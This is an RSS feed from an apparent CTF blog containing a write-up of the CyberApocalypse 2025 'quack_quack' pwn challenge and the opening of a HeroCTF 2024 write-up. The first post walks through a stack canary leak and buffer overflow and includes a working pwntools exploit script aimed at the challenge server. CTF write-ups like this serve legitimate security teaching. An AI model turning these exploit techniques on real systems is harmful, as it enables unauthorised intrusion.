<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on conflict</title>
        <link>/posts/</link>
        <description>Recent content in Posts on conflict</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 23 Mar 2025 00:00:00 +0000</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>🇬🇧 CyberApocalypse 2025 - pwn/quack_quack</title>
            <link>/posts/2025/03/cyberapocalypse-2025-pwn/quack_quack/</link>
            <pubDate>Sun, 23 Mar 2025 00:00:00 +0000</pubDate>
            
            <guid>/posts/2025/03/cyberapocalypse-2025-pwn/quack_quack/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Writeup for the first &lt;code&gt;pwn&lt;/code&gt; challenge from CyberApocalypse 2025.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On the quest to reclaim the Dragon&amp;#39;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it&amp;#39;s time to face the Duck!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re given the binary and the libc it uses&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;quack_quack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;quack_quack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/cyberapocalypse2025/pwn/quack_quack/quack_quack&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Full&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;0x400000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RUNPATH&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./glibc/&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;SHSTK&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;IBT&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stripped&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;quack_quack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;dynamically&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;interpreter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;glibc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;ld-linux-x86-64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;so&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;225daf82164eadc6e19bee1cd1965754eefed6aa&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;GNU&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Linux&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the program prompts us to &amp;ldquo;Quack the duck&amp;rdquo; and it seems to exit no matter what we enter as input, forcing us to examine the decompilation.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Writeup for the first <code>pwn</code> challenge from CyberApocalypse 2025.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>On the quest to reclaim the Dragon&#39;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! 
</span></span><span style="display:flex;"><span>Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it&#39;s time to face the Duck!
</span></span></code></pre></div><h2 id="file-information">File information</h2>
<p>We&rsquo;re given the binary and the libc it uses</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">quack_quack</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">quack_quack</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/cyberapocalypse2025/pwn/quack_quack/quack_quack&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>    <span style="color:#f92672">b</span><span style="color:#e6db74">&#39;./glibc/&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">SHSTK</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">IBT</span><span style="color:#f92672">:</span>        <span style="color:#f92672">Enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">quack_quack</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">./</span><span style="color:#f92672">glibc</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">225daf82164eadc6e19bee1cd1965754eefed6aa</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>Running the program prompts us to &ldquo;Quack the duck&rdquo; and it seems to exit no matter what we enter as input, forcing us to examine the decompilation.</p>
<h2 id="reversing-the-binary">Reversing the binary</h2>
<p><img src="https://i.ibb.co/7xJnznY7/2025-03-22-235503-570x523-scrot.png" alt="2025-03-22-235503_570x523_scrot"></p>
<p>This is the <code>duckling()</code> function (which is essentially the main function). Right away, we understand why the program was exiting: our first input has to contain &ldquo;Quack Quack &quot; (the space at the end is important) for the program to continue.</p>
<p>We see that after the first input there is a second input, which will read 106 bytes into an unknown buffer. We&rsquo;ll determine its size later.</p>
<p>Essentially, the program returns after the second input, which suggests that we need to disrupt its execution flow through one of the two inputs.</p>
<h2 id="identifying-vulnerabilities">Identifying vulnerabilities</h2>
<p>Since the program has no PIE but has stack canaries, we understand that the first step is going to be leaking the canaries to achieve a successful buffer overflow.</p>
<p>The first vulnerability lies in this piece of code:</p>
<p><img src="https://i.ibb.co/RT366jxp/2025-03-23-000508-577x112-scrot.png" alt="2025-03-23-000508_577x112_scrot"></p>
<p>Here, <code>strstr()</code> will return a pointer to the first occurrence of &ldquo;Quack Quack &quot; inside the buffer. Then, <code>printf()</code> will display all text characters (due to the <code>%s</code>) from that offset and 32 bytes after.</p>
<p>This can be leveraged to leak data from the stack, because if we fill the input buffer with dummy data, then put &ldquo;Quack Quack &quot; at the end, it will read beyond the buffer and leak stack data.</p>
<p>To confirm this, we can test it while debugging the program:</p>
<p><img src="https://i.ibb.co/7tBy5ssb/2025-03-23-001602-1403x176-scrot.png" alt="2025-03-23-001602_1403x176_scrot"></p>
<p>Here we can see that the end of our input ends up 32 bytes before RBP, which is perfect because the program should leak us 32 bytes, and that will contain the canary (its value is the one above RBP, here it is <code>0xd779...</code>)</p>
<p>Let&rsquo;s check that it works:</p>
<p><img src="https://i.ibb.co/JRyNYF25/2025-03-23-002205-494x73-scrot.png" alt="2025-03-23-002205_494x73_scrot"></p>
<p>Indeed, we did get some leaks from the stack. Though we can&rsquo;t verify that it&rsquo;s the canary because the characters are not printable, it should be correct.</p>
<p>Now for the second vulnerability, we can assume it&rsquo;s a buffer overflow in the second input. Let&rsquo;s investigate and try to determine after how many characters the program crashes.</p>
<p>The following line indicates the buffer is 0x60 bytes long, but since there are stack canaries, it will only be 0x58 bytes.</p>
<p><img src="https://i.ibb.co/k2LFMfPc/2025-03-23-003147-531x26-scrot.png" alt="2025-03-23-003147_531x26_scrot"></p>
<p>This confirms that we have a buffer overflow because the <code>read()</code> will be reading 106 bytes of input into an 88-byte buffer.</p>
<p>Let&rsquo;s confirm this by simply sending a large input:</p>
<p><img src="https://i.ibb.co/xq70FLBt/2025-03-23-005552-1896x260-scrot.png" alt="2025-03-23-005552_1896x260_scrot"></p>
<p>Indeed, we overflowed the buffer, but that triggered the stack smashing detection.</p>
<p>Finally, we need to know where to jump in the program. Since this is a CTF challenge, it has a &ldquo;win&rdquo; function called <code>duck_attack()</code>:</p>
<p><img src="https://i.ibb.co/KcqrVTSs/2025-03-23-005956-518x449-scrot.png" alt="2025-03-23-005956_518x449_scrot"></p>
<p>So we&rsquo;ll jump to the address of this function, which is static because PIE isn&rsquo;t enabled.</p>
<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
<ol>
<li>Fill the first input buffer so it leaks values from the stack</li>
<li>Parse the output to extract the value of the stack canary</li>
<li>Craft a payload that will overwrite RIP with <code>duck_attack()</code>&rsquo;s address, without triggering the stack smashing detector</li>
</ol>
<h2 id="solve-script">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./quack_quack&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;94.237.57.171&#34;</span>, <span style="color:#ae81ff">51170</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./quack_quack&#34;</span>)
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>first_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, first_payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>adresses <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Quack Quack &#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,&#34;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>canary_bytes <span style="color:#f92672">=</span> adresses[:<span style="color:#ae81ff">7</span>]
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> canary_bytes<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(canary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;canary value = &#34;</span> <span style="color:#f92672">+</span> hex(canary))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>second_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">88</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;duck_attack&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, second_payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>This was a fun challenge even though it was a standard stack canary bypass. It&rsquo;s always good to review acquired knowledge.</p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 HeroCTF 2024 - pwn/bankrupst</title>
            <link>/posts/2024/10/heroctf-2024-pwn/bankrupst/</link>
            <pubDate>Sun, 27 Oct 2024 00:00:00 +0000</pubDate>
            
            <guid>/posts/2024/10/heroctf-2024-pwn/bankrupst/</guid>
            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of contents&lt;/h3&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#file-information&#34;&gt;File Information&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#looking-for-a-vulnerability&#34;&gt;Looking for a vulnerability&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#exploit-plan-tldr&#34;&gt;Exploit Plan (TLDR)&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#solve-script&#34;&gt;Solve Script&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Writeup for the first &lt;code&gt;pwn&lt;/code&gt; challenge from HeroCTF 2024.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BankRupst is a bank operating in bankruptcy where no laws are applicable.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re given the binary and the source code which is written in Rust.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;bankrupst&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;bankrupst&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/heroctf2024/pwn/pwn_bankrupst/bankrupst&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Full&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stripped&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt;
